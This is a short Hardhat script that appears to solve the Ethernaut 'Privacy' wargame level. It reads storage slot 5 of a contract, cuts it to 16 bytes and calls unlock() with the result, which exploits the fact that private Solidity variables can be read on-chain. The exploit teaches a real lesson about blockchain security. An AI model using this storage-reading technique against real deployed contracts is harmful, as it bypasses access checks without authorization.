import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x3Ca8f9C04c7e3E1624Ac2008F92f6F366A869444";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Privacy", CONTRACT_ADDRESS, signer);

    const dataArraySlot = 5;
    const key32 = await ethers.provider.getStorageAt(contract.address, dataArraySlot);
    const key16 = key32.slice(0, 16 * 2 + 2);

    await contract.unlock(key16);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
